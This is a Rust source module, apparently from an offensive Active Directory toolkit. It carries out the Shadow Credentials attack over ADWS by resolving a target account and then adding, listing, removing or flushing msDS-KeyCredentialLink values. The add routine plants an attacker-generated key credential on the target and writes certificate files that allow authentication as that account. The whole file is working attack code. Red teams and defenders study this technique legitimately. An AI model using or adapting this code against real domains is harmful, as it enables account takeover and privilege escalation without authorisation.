//! Shadow Credentials over ADWS: add / list / remove / flush
//! `msDS-KeyCredentialLink`. Payload building is shared via
//! `actions::common::keycred`; only the read/modify goes through adws.

use anyhow::{anyhow, Result};
use adws_rs::{AdwsClient, Mod, Scope, Value};
use log::debug;

use crate::actions::common::keycred::KEYCRED_ATTR;
use crate::actions::common::{base_dn, keycred};
use crate::args::Options;
use crate::shlog;

use super::escape_filter;

/// Resolve a sAMAccountName (or CN, with/without trailing `$`) to its DN.
async fn find_target_dn(client: &mut AdwsClient, base: &str, sam: &str) -> Result<String> {
    let dollar = format!("{sam}$");
    let filter = format!(
        "(|(sAMAccountName={})(sAMAccountName={})(cn={}))",
        escape_filter(sam),
        escape_filter(&dollar),
        escape_filter(sam),
    );
    let entries = client
        .search(base, Scope::Subtree, &filter, &["distinguishedName"], None, false)
        .await
        .map_err(|e| anyhow!("ADWS resolve of '{sam}': {e}"))?;
    entries.into_iter().next().map(|e| e.dn).ok_or_else(|| anyhow!("object '{sam}' not found"))
}

/// Read every `msDS-KeyCredentialLink` value (text or raw-bytes, lossy UTF-8).
async fn read_keycred_values(client: &mut AdwsClient, target_dn: &str) -> Result<Vec<String>> {
    let entries = client
        .search(target_dn, Scope::Base, "(objectClass=*)", &[KEYCRED_ATTR], None, false)
        .await
        .map_err(|e| anyhow!("ADWS read of target: {e}"))?;
    let e = entries.into_iter().next().ok_or_else(|| anyhow!("could not read target object"))?;
    let mut vals: Vec<String> = e.attrs.get(KEYCRED_ATTR).cloned().unwrap_or_default();
    if let Some(bin) = e.bin_attrs.get(KEYCRED_ATTR) {
        for b in bin {
            vals.push(String::from_utf8_lossy(b).into_owned());
        }
    }
    Ok(vals)
}

pub async fn list(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base = base_dn(&opts.domain);
    let dn = find_target_dn(client, &base, target).await?;
    let values = read_keycred_values(client, &dn).await?;
    keycred::print_list(target, &values);
    Ok(())
}

pub async fn add(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base = base_dn(&opts.domain);
    let dn = find_target_dn(client, &base, target).await?;

    let m = keycred::generate(target, &dn, &opts.domain)?;

    debug!("[shadow_cred] writing {KEYCRED_ATTR} on {dn}");
    client
        .modify(&dn, &[Mod::add(KEYCRED_ATTR, vec![Value::Text(m.value.clone())])], None)
        .await
        .map_err(|e| anyhow!("add_shadow_cred ADWS modify failed: {e}"))?;

    shlog!("Shadow credential added to '{target}'");
    shlog!("    DeviceID: {}", keycred::format_device_guid(&m.device_id));
    keycred::write_cert_files_and_hint(target, &opts.domain, &m)?;
    Ok(())
}

pub async fn remove(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let key_id = opts
        .shadow_key_id
        .as_deref()
        .ok_or_else(|| anyhow!("--shadow-key-id required (DeviceID from list_shadow_cred)"))?;
    let wanted = keycred::parse_device_guid(key_id)
        .ok_or_else(|| anyhow!("invalid DeviceID '{key_id}': expected GUID or 32 hex chars"))?;

    let base = base_dn(&opts.domain);
    let dn = find_target_dn(client, &base, target).await?;
    let values = read_keycred_values(client, &dn).await?;
    if values.is_empty() {
        shlog!("No shadow credentials on '{target}', nothing to remove");
        return Ok(());
    }

    let (keep, removed): (Vec<_>, Vec<_>) = values.iter().partition(|v| {
        keycred::parse_dnwithbinary(v).map(|kc| kc.device_id != wanted).unwrap_or(true)
    });
    if removed.is_empty() {
        return Err(anyhow!("DeviceID '{key_id}' not found on '{target}' (run list_shadow_cred)"));
    }

    if keep.is_empty() {
        client.modify(&dn, &[Mod::delete_all(KEYCRED_ATTR)], None).await
    } else {
        let vals: Vec<Value> = keep.into_iter().map(|v| Value::Text(v.clone())).collect();
        client.modify(&dn, &[Mod::replace(KEYCRED_ATTR, vals)], None).await
    }
    .map_err(|e| anyhow!("remove_shadow_cred ADWS modify failed: {e}"))?;

    shlog!("Shadow credential '{key_id}' removed from '{target}'");
    Ok(())
}

pub async fn flush(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base = base_dn(&opts.domain);
    let dn = find_target_dn(client, &base, target).await?;
    client
        .modify(&dn, &[Mod::delete_all(KEYCRED_ATTR)], None)
        .await
        .map_err(|e| anyhow!("flush_shadow_cred ADWS modify failed: {e}"))?;
    shlog!("All shadow credentials cleared from '{target}'");
    Ok(())
}